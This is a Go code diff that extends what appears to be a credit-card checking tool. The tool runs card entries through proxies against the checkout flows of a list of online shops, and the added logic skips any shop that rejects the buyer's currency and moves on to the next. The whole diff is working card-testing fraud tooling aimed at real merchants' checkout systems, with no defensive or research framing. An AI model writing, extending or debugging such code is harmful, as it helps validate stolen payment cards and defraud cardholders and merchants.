@@ -1780,6 +1780,14 @@ var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localize
 var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"`)
 var errMissingReceiptID = errors.New("submit response missing receiptId")
 var errStoreIncompatible = errors.New("store incompatible")
+var errCurrencyNotSupported = errors.New("BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP")
+
+// hasCurrencyNotSupportedError returns true if the proposal body contains the
+// BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP error code, meaning the shop
+// does not accept the buyer's currency and we should skip to the next shop.
+func hasCurrencyNotSupportedError(body string) bool {
+        return strings.Contains(body, "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP")
+}
 
 func checkProposalErrors(step string, status int, body string) {
         if status != 200 {
@@ -2005,6 +2013,33 @@ func findWorkingProxies(proxies []string) ([]string, error) {
         return working, nil
 }
 
+// runCheckoutWithShopList tries the card against each shop in order.
+// If a shop returns BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP it is
+// skipped and the next shop is tried with the same card.
+// All other results (success, decline, error) stop the loop immediately.
+func runCheckoutWithShopList(shops []string, cardEntry, proxyURL string) (*CheckResult, error) {
+        if len(shops) == 0 {
+                return nil, fmt.Errorf("shop list is empty")
+        }
+        var lastResult *CheckResult
+        var lastErr error
+        for i, shop := range shops {
+                fmt.Printf("\n[Shop %d/%d] Trying %s\n", i+1, len(shops), shop)
+                res, err := runCheckoutForCard(shop, cardEntry, proxyURL)
+                lastResult = res
+                lastErr = err
+                if err != nil && errors.Is(err, errCurrencyNotSupported) {
+                        fmt.Printf("  → Currency not supported, skipping to next shop\n")
+                        continue
+                }
+                // Any other outcome — stop and return
+                return res, err
+        }
+        // Every shop returned currency-not-supported
+        fmt.Printf("  [!] All shops returned CURRENCY_NOT_SUPPORTED for this card\n")
+        return lastResult, lastErr
+}
+
 func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
         currency := "USD"
         country := "US"
@@ -2130,6 +2165,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
                 return result, result.Error
         }
         saveDebugResponse("proposal", proposalBody)
+        if hasCurrencyNotSupportedError(proposalBody) {
+                result.Status = StatusError
+                result.StatusCode = "CURRENCY_NOT_SUPPORTED"
+                result.Error = errCurrencyNotSupported
+                return result, result.Error
+        }
 
         if cur := extractSellerCurrency(proposalBody); cur != "" && cur != currency {
                 currency = cur
@@ -2163,6 +2204,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
                 return result, result.Error
         }
         saveDebugResponse("proposal2", proposal2Body)
+        if hasCurrencyNotSupportedError(proposal2Body) {
+                result.Status = StatusError
+                result.StatusCode = "CURRENCY_NOT_SUPPORTED"
+                result.Error = errCurrencyNotSupported
+                return result, result.Error
+        }
         queueToken2 := extractQueueToken(proposal2Body)
         if queueToken2 == "" {
                 result.Status = StatusError
@@ -2179,6 +2226,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
                 return result, result.Error
         }
         saveDebugResponse("proposal3", proposal3Body)
+        if hasCurrencyNotSupportedError(proposal3Body) {
+                result.Status = StatusError
+                result.StatusCode = "CURRENCY_NOT_SUPPORTED"
+                result.Error = errCurrencyNotSupported
+                return result, result.Error
+        }
         queueToken3 := extractQueueToken(proposal3Body)
         if queueToken3 == "" {
                 result.Status = StatusError
@@ -2195,6 +2248,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
                 return result, result.Error
         }
         saveDebugResponse("proposal4", proposal4Body)
+        if hasCurrencyNotSupportedError(proposal4Body) {
+                result.Status = StatusError
+                result.StatusCode = "CURRENCY_NOT_SUPPORTED"
+                result.Error = errCurrencyNotSupported
+                return result, result.Error
+        }
         queueToken4 := extractQueueToken(proposal4Body)
         if queueToken4 == "" {
                 result.Status = StatusError
@@ -2212,6 +2271,12 @@ func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, erro
         }
         _ = proposal5Status
         saveDebugResponse("proposal5", proposal5Body)
+        if hasCurrencyNotSupportedError(proposal5Body) {
+                result.Status = StatusError
+                result.StatusCode = "CURRENCY_NOT_SUPPORTED"
+                result.Error = errCurrencyNotSupported
+                return result, result.Error
+        }
 
         // Step 9
         identSig := extractIdentificationSignature(checkoutHTML)
